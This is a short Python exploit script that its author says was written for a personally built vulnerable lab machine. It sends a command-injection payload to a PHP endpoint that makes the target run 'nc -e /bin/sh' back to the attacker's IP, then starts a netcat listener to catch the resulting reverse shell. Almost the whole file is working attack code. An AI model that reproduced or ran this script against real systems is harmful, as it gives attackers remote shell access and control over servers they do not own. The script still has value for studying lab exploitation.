#A simple exploit written in python that i made for my own vulnerable machine david
#Use python davidexp.py ip port
#ip is vm's ip
#port is web server's port
#pip install requests 

import os
import socket
import sys
import requests
from threading import Thread
def req():
        requests.get(("http://"+ip+"/interpreter/vuln.php?com=import os;os.system(\"nc -e /bin/sh "+localip+" 555\")"))
ip=sys.argv[1]
port=int(sys.argv[2])
s=socket.socket()
for a in range(0,21):
        try:
                s.connect((ip,port))
        except:
                pass
        if(a==20):
                print("couldn't connect")
                sys.exit()
localip=s.getsockname()[0]
print(localip)
dum = Thread(target = req, args = ())
dum.start()
print("wait a little bit for connection")
os.system("nc -lvvp 555")
